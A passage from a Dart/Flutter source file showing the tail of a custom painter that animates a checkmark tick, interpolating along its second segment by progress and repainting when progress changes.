    } else {
      path.lineTo(p2.dx, p2.dy);
      final rem = drawn - seg1;
      final seg2 = _dist(p2, p3);
      final t = (rem / seg2).clamp(0.0, 1.0);
      path.lineTo(
          p2.dx + (p3.dx - p2.dx) * t,
          p2.dy + (p3.dy - p2.dy) * t);
    }

    canvas.drawPath(path, tickPaint);
  }

  double _dist(Offset a, Offset b) =>
      sqrt((b.dx - a.dx) * (b.dx - a.dx) + (b.dy - a.dy) * (b.dy - a.dy));

  @override
  bool shouldRepaint(_TickPainter old) => old.progress != progress;
}
